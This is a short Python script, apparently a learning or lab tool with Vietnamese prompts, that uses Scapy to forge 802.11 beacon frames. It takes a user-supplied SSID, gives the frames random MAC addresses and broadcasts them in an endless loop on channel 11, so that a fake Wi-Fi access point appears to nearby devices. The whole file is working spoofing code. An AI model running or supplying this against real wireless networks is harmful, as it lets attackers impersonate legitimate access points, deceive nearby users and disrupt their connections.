from scapy.all import *

conf.iface="wlp0s20f3mon"
interface=input(f"Nhập interface mạng được thiết lập monitor mode ({conf.iface}): ").strip()
if len(interface)>0:
    conf.iface=interface
ssid =input("Nhập tên diểm truy cập muốn giả mạo: ")     
channel = 11

def create_fake_ap(ssid, iface):
    dot11 = Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF", addr2=RandMAC(), addr3=RandMAC())
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID",info=ssid, len=len(ssid))
    dsset = Dot11Elt(ID="DSset",info=chr(channel))
    frame = RadioTap()/dot11/beacon/essid/dsset
    
    print("frame:", frame)
    frame.show()
    
    sendp(frame, iface=conf.iface, loop=1)

if __name__ == "__main__":
    create_fake_ap(ssid, interface)